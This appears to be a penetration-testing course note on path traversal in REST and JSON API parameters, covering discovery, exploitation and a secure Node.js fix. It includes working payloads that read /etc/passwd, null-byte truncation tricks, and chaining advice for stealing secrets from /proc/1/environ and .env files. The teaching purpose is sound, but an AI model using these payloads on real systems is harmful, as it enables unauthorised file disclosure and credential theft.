---
tags: [vapt, path-traversal, api, intermediate]
difficulty: intermediate
module: "23 - Path Traversal and LFI/RFI"
topic: "23.11 Path Traversal in API Parameters"
---

# 23.11 — Path Traversal in API Parameters

## What is it?
Modern web applications have largely moved away from traditional monolithic architectures (where parameters like `?page=about.php` dictate file inclusion) toward RESTful APIs and microservices. However, Path Traversal vulnerabilities are still highly prevalent in APIs, just in different contexts.

Instead of including PHP files, modern APIs often use parameters to fetch data, load localized translation files, retrieve user avatars from cloud buckets, or query backend microservices. If an API endpoint like `/api/v1/user/documents/{doc_id}` directly passes the `{doc_id}` to the filesystem or an internal storage service without sanitization, an attacker can use traversal sequences.

Because APIs often communicate using JSON and rely on framework routing, standard WAF rules looking for `../` in URL query strings might completely miss a payload hidden deep within a JSON POST body or embedded inside a RESTful path segment.

Think of it like a highly secure corporate mailroom (the API). They check the return address on the outside of the envelope (the URL). But if the actual letter inside the envelope says "Deliver this directly to the CEO's desk" (JSON body), and the internal robot blindly follows it, the system is breached.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. POST /api/v1/templates/render
   │    {"template_name": "../../../../etc/passwd", "data": {}}
   ▼
[API Gateway / WAF]
   │
   │ 2. URL looks clean (/api/v1/templates/render). Passes request.
   ▼
[Backend Microservice (NodeJS/Python)]
   │
   │ 3. Parses JSON. Extracts template_name.
   │ 4. Calls: fs.readFileSync("/var/app/templates/" + template_name)
   │ 5. Path resolves to /etc/passwd
   ▼
[File System] ─── 6. Returns /etc/passwd content to API.
   │
[Response] ─── 7. Sends JSON response containing file contents back to Attacker.
```

## How to Find It
- **Manual steps:**
  1. Identify API endpoints that deal with file retrieval, document generation (e.g., PDF generation), localization (fetching language packs), or template rendering.
  2. Look for JSON parameters like `"avatar_file"`, `"template"`, `"lang"`, or REST path variables like `/api/files/{id}`.
  3. Inject traversal sequences into the JSON payload or the path. *Note: If injecting into a REST path, you usually must URL-encode the slashes (`..%2f..%2f`) so the web server routing doesn't interpret them as actual directory boundaries.*
  4. Check the API response. Modern APIs might not return the file directly but might return a Base64 encoded string, or throw a verbose stack trace revealing the local file path.

- **Tool commands with flags explained:**
  Using `curl` to test JSON payloads:
  ```bash
  curl -X POST "https://api.target.com/v1/export" \
       -H "Content-Type: application/json" \
       -H "Authorization: Bearer <token>" \
       -d '{"format": "pdf", "template": "../../../../../../etc/passwd"}'
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Locate the vulnerable API parameter.
  2. Determine the OS of the container/backend (Linux is most common for APIs).
  3. Craft a JSON payload with standard `../` sequences targeting `/etc/passwd`.
  4. If the API expects a specific file extension (e.g., it enforces `.json`), try Null Byte injection (`%00` or `\u0000` in JSON) to truncate it.
  5. Analyze the response. If the data is Base64 encoded (common for API file downloads), decode it locally.

- **Actual payloads:**
  **JSON Body Payload:**
  ```json
  {
    "action": "load_language",
    "lang_file": "../../../../../../../etc/passwd"
  }
  ```
  **REST Path Payload (URL Encoded):**
  ```text
  GET /api/v1/documents/..%2f..%2f..%2f..%2fetc%2fpasswd
  ```
  **JSON Null Byte (Unicode):**
  ```json
  {
    "theme": "../../../../../../../etc/passwd\u0000"
  }
  ```

- **Real HTTP request/response examples:**
  **Exploit Request:**
  ```http
  POST /api/localization/get_strings HTTP/1.1
  Host: api.target.com
  Content-Type: application/json

  {
    "language": "../../../../../../etc/passwd"
  }
  ```
  **Exploit Response:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: application/json
  
  {
    "status": "success",
    "data": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon..."
  }
  ```

## Real-World Example
A Bug Bounty hunter analyzed a modern React application powered by a NodeJS API. The application had a feature to switch languages, sending `POST /api/lang` with `{"locale": "en-US"}`. The backend Node application mapped this directly: `fs.readFileSync(path.join('./locales', req.body.locale + '.json'))`. The hunter sent `{"locale": "../../../../../etc/passwd\u0000"}`. The Node backend, vulnerable to null byte truncation in older versions, dropped the `.json` extension, read the password file, and returned it inside the JSON response, yielding a critical finding.

## How to Fix It
- **Developer remediation:**
  APIs should enforce strict typing and validation. If a parameter expects a language code, validate it against a Regex (e.g., `^[a-z]{2}-[A-Z]{2}$`) or a hardcoded Enum. Never blindly trust string input for filesystem operations. Additionally, ensure the API framework automatically handles and sanitizes path variables.

- **Code snippet:**
  **NodeJS (Secure Implementation with validation):**
  ```javascript
  const path = require('path');
  const fs = require('fs');

  app.post('/api/lang', (req, res) => {
      const locale = req.body.locale;
      
      // Strict regex validation: only letters and hyphens allowed
      if (!/^[a-zA-Z-]+$/.test(locale)) {
          return res.status(400).json({ error: "Invalid locale format" });
      }

      const safePath = path.join(__dirname, 'locales', `${locale}.json`);
      
      // Secondary check: ensure the resolved path stays within the locales directory
      if (!safePath.startsWith(path.join(__dirname, 'locales'))) {
          return res.status(403).json({ error: "Directory traversal detected" });
      }

      res.json(JSON.parse(fs.readFileSync(safePath)));
  });
  ```

## Chaining Opportunities
- This vuln + [[10 - Chaining Playbook (Database Credentials)]] → APIs often run in Docker containers. Use Path Traversal to read `/proc/1/environ` or the `.env` file in the application directory to steal AWS keys, database passwords, or JWT signing secrets.
- This vuln + [[13.01 SSRF (Server-Side Request Forgery)]] → If the API parameter points to an internal URL instead of a file (e.g., fetching a profile picture from an internal microservice), Path Traversal in the URL path can be used to hit different microservice endpoints (e.g., `/api/fetch?url=http://internal-service/images/../../admin/delete`).

## Related Notes
- [[01 - What is Path Traversal?]]
- [[03 - Encoding Bypass for Path Traversal]]
- [[12 - Defense — Canonicalization, Allowlists, Chroot]]
